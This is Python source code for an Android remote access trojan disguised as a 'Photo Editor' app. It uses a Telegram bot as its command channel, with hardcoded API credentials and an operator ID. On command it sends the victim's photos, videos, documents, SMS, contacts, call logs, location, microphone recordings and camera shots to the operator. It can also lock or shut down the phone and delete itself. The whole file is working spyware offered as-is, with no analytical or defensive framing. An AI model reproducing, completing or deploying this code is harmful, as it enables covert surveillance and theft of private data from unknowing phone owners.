from kivy.app import App
from kivy.uix.label import Label
from jnius import autoclass
import os
import shutil
import time
import uuid
import base64
from telethon import TelegramClient, events
import threading
from kivy.utils import platform
import hashlib
from cryptography.fernet import Fernet  # For encryption

# Android-specific imports
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
PackageManager = autoclass('android.content.pm.PackageManager')
PowerManager = autoclass('android.os.PowerManager')
Uri = autoclass('android.net.Uri')
TelephonyManager = autoclass('android.telephony.TelephonyManager')
LocationManager = autoclass('android.location.LocationManager')
AudioRecord = autoclass('android.media.AudioRecord')
MediaRecorder = autoclass('android.media.MediaRecorder')

# Telegram setup
api_id = '27152769'  # Replace with your API ID
api_hash = 'b98dff566803b43b3c3120eec537fc1d'  # Replace with your API Hash
client = TelegramClient('rat_session', api_id, api_hash)
MY_ID = 7930646071  # Replace with your Telegram ID
ENCRYPTION_KEY = Fernet.generate_key()  # Encryption for data
cipher = Fernet(ENCRYPTION_KEY)

# Device-specific ID
DEVICE_ID = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()  # Unique per device

class RATApp(App):
    def build(self):
        return Label(text='Photo Editor')  # Harmless UI

    def on_start(self):
        self.device_control = DeviceControl()
        threading.Thread(target=self.start_control, daemon=True).start()

    def start_control(self):
        client.loop.run_until_complete(client.start())
        client.loop.run_until_complete(self.init_device())
        client.loop.run_until_complete(self.listen_commands())

    async def init_device(self):
        await client.send_message(MY_ID, f"Device {DEVICE_ID} activated!")

    async def listen_commands(self):
        @client.on(events.NewMessage(from_users=MY_ID))
        async def handler(event):
            cmd = event.message.text.lower()
            parts = cmd.split()
            target_id = parts[1] if len(parts) > 1 else None

            # Check if command is for this device
            if target_id != DEVICE_ID and target_id is not None:
                return

            command = parts[0]
            if command == '!photos':
                await self.device_control.steal_photos()
            elif command == '!videos':
                await self.device_control.steal_videos()
            elif command == '!files':
                await self.device_control.steal_files()
            elif command == '!apps':
                await self.device_control.list_apps()
            elif command == '!sms':
                await self.device_control.steal_sms()
            elif command == '!contacts':
                await self.device_control.steal_contacts()
            elif command == '!calllogs':
                await self.device_control.steal_call_logs()
            elif command == '!location':
                await self.device_control.get_location()
            elif command == '!mic':
                await self.device_control.record_mic()
            elif command == '!camera':
                await self.device_control.take_photo()
            elif command == '!shutdown':
                await self.device_control.shutdown()
            elif command == '!lock':
                await self.device_control.lock_screen()
            elif command == '!open':
                app_name = parts[2] if len(parts) > 2 else None
                await self.device_control.open_app(app_name)
            elif command == '!close':
                app_name = parts[2] if len(parts) > 2 else None
                await self.device_control.close_app(app_name)
            elif command == '!selfdestruct':
                await self.device_control.self_destruct()

class DeviceControl:
    def __init__(self):
        self.context = autoclass('org.kivy.android.PythonActivity').mActivity
        self.pm = self.context.getPackageManager()

    async def steal_photos(self):
        path = '/storage/emulated/0/DCIM/Camera/'
        for file in os.listdir(path):
            if file.endswith(('.jpg', '.png')):
                await self._send_encrypted_file(os.path.join(path, file))
        await client.send_message(MY_ID, f"{DEVICE_ID}: Photos sent!")

    async def steal_videos(self):
        path = '/storage/emulated/0/DCIM/Camera/'
        for file in os.listdir(path):
            if file.endswith(('.mp4', '.3gp')):
                await self._send_encrypted_file(os.path.join(path, file))
        await client.send_message(MY_ID, f"{DEVICE_ID}: Videos sent!")

    async def steal_files(self):
        path = '/storage/emulated/0/Documents/'
        for file in os.listdir(path):
            if file.endswith(('.txt', '.pdf', '.docx')):
                await self._send_encrypted_file(os.path.join(path, file))
        await client.send_message(MY_ID, f"{DEVICE_ID}: Files sent!")

    async def list_apps(self):
        packages = self.pm.getInstalledApplications(PackageManager.GET_META_DATA)
        app_list = "\n".join([pkg.packageName for pkg in packages])
        await client.send_message(MY_ID, f"{DEVICE_ID} Apps:\n{app_list}")

    async def steal_sms(self):
        cursor = self.context.getContentResolver().query(Uri.parse("content://sms/inbox"), None, None, None, None)
        sms_list = []
        while cursor.moveToNext():
            body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
            sms_list.append(body)
        await client.send_message(MY_ID, f"{DEVICE_ID} SMS:\n" + "\n".join(sms_list))

    async def steal_contacts(self):
        ContactsContract = autoclass('android.provider.ContactsContract')
        cursor = self.context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, None, None, None, None)
        contacts = []
        while cursor.moveToNext():
            name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
            contacts.append(f"{name}: {number}")
        await client.send_message(MY_ID, f"{DEVICE_ID} Contacts:\n" + "\n".join(contacts))

    async def steal_call_logs(self):
        CallLog = autoclass('android.provider.CallLog$Calls')
        cursor = self.context.getContentResolver().query(CallLog.CONTENT_URI, None, None, None, None)
        logs = []
        while cursor.moveToNext():
            number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.NUMBER))
            logs.append(number)
        await client.send_message(MY_ID, f"{DEVICE_ID} Call Logs:\n" + "\n".join(logs))

    async def get_location(self):
        lm = self.context.getSystemService(Context.LOCATION_SERVICE)
        location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if location:
            lat, lon = location.getLatitude(), location.getLongitude()
            await client.send_message(MY_ID, f"{DEVICE_ID} Location: {lat}, {lon}")
        else:
            await client.send_message(MY_ID, f"{DEVICE_ID}: Location not available")

    async def record_mic(self):
        recorder = MediaRecorder()
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        output = f"/sdcard/mic_{DEVICE_ID}.3gp"
        recorder.setOutputFile(output)
        recorder.prepare()
        recorder.start()
        time.sleep(5)  # Record for 5 seconds
        recorder.stop()
        recorder.release()
        await self._send_encrypted_file(output)

    async def take_photo(self):
        Camera = autoclass('android.hardware.Camera')
        camera = Camera.open()
        camera.startPreview()
        time.sleep(1)  # Wait for camera to stabilize
        output = f"/sdcard/cam_{DEVICE_ID}.jpg"
        camera.takePicture(None, None, lambda shutter, raw, jpeg: open(output, 'wb').write(jpeg))
        camera.release()
        await self._send_encrypted_file(output)

    async def shutdown(self):
        intent = Intent("android.intent.action.ACTION_REQUEST_SHUTDOWN")
        intent.putExtra("android.intent.extra.KEY_CONFIRM", False)
        self.context.startActivity(intent)
        await client.send_message(MY_ID, f"{DEVICE_ID}: Shutting down!")

    async def lock_screen(self):
        dm = self.context.getSystemService(Context.DEVICE_POLICY_SERVICE)
        dm.lockNow()
        await client.send_message(MY_ID, f"{DEVICE_ID}: Screen locked!")

    async def open_app(self, package_name):
        intent = self.pm.getLaunchIntentForPackage(package_name)
        if intent:
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            self.context.startActivity(intent)
            await client.send_message(MY_ID, f"{DEVICE_ID}: Opened {package_name}")
        else:
            await client.send_message(MY_ID, f"{DEVICE_ID}: App not found!")

    async def close_app(self, package_name):
        am = self.context.getSystemService(Context.ACTIVITY_SERVICE)
        am.killBackgroundProcesses(package_name)
        await client.send_message(MY_ID, f"{DEVICE_ID}: Closed {package_name}")

    async def self_destruct(self):
        await client.send_message(MY_ID, f"{DEVICE_ID}: Self-destructing...")
        os.remove(__file__)  # Delete the app file (needs root for full uninstall)
        os._exit(0)

    async def _send_encrypted_file(self, file_path):
        with open(file_path, 'rb') as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(f"{file_path}.enc", 'wb') as f:
            f.write(encrypted_data)
        await client.send_file(MY_ID, f"{file_path}.enc")

if __name__ == '__main__':
    RATApp().run()
